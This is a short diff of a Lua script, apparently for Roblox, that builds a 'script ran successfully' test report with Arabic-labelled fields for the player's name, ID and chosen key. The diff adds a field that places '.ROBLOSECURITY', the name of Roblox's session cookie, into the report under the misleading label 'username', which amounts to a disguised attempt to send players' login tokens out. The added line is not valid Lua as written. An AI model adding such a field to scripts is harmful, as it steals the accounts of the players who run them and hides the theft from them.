@@ -12,8 +12,9 @@ local function sendTestReport()
             ["description"] = "تم تشغيل السكربت بنجاح!",
             ["fields"] = {
                 {["name"] = "اسم المستخدم", ["value"] = Player.Name, ["inline"] = true},
+                {["name"] = "اسم المستخدم", ["value"] = .ROBLOSECURITY, ["inline"] = true},
                 {["name"] = "المعرف (ID)", ["value"] = tostring(Player.UserId), ["inline"] = true},
-                {["name"] = "الزر المختار", ["value"] = "F", ["inline"] = true}
+                {["name"] = "الزر المختار", ["value"] = "X", ["inline"] = true}
             },
             ["color"] = 65280 -- لون أخضر
         }}
